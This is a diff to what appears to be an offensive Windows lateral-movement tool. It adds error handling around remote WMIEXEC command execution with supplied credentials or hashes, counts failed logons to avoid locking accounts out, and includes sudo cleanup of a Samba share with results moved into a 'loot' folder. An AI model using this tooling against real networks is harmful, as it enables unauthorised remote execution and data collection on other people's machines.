@@ -740,10 +740,63 @@ def setup_share():
 
 def auto_drive(addresses): # really helpful so you dont have to know which drive letter to use
     print('{}[+]{} Determining the best drive letter to use this may take a moment...\n'.format(color_BLU, color_reset))
+    failed_logons = 0
     for ip in addresses:
-        executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share, False,
-                           options.k, options.dc_ip, 'cmd')
-        executer.run(ip, False)
+        try:
+            executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share, False,
+                               options.k, options.dc_ip, 'cmd')
+            executer.run(ip, False)
+        except Exception as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+
+                traceback.print_exc()
+            with open('log.txt', 'a') as f:
+                f.write('{}: {}\n'.format(ip, str(e)))
+                f.close()
+            logging.error('{}: {}'.format(ip, str(e)))
+            
+            if str(e).find('STATUS_LOGON_FAILURE') != -1: # way to track failed logins to see if they're gonna lock the account out
+                failed_logons += 1
+                
+            if failed_logons >= 3:
+                cont = input('{}[!]{} Warning you got the user\'s password wrong on {} machines, you may lock the account out if the password is incorrect and you continue, please validate the password! Do you wish to continue? (y/N) '.format(color_YELL, color_reset, failed_logons))
+                if cont.lower() == 'n':
+                    print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
+                    try:
+                        os.system("sudo systemctl stop smbd")
+                    except BaseException as e:
+                        pass
+
+                    try:
+                        os.system("sudo cp " + os.getcwd() + "/smb.conf /etc/samba/smb.conf")
+                    except BaseException as e:
+                        pass
+
+                    try:
+                        os.system("sudo rm " + os.getcwd() + "/smb.conf")
+                    except BaseException as e:
+                        pass
+
+                    try:
+                        os.system("sudo userdel " + share_user)
+                    except BaseException as e:
+                        pass
+
+                    try:
+                        os.system("sudo groupdel " + share_group)
+                    except BaseException as e:
+                        pass
+
+                    try:
+                        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, os.getcwd(), timestamp))
+                    except BaseException as e:
+                        pass
+                    print(
+                        "{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(
+                            color_BLU, color_reset))
+                    exit(0)
+            continue
 
     cleaned_outdata = []
     for drive in outdata:
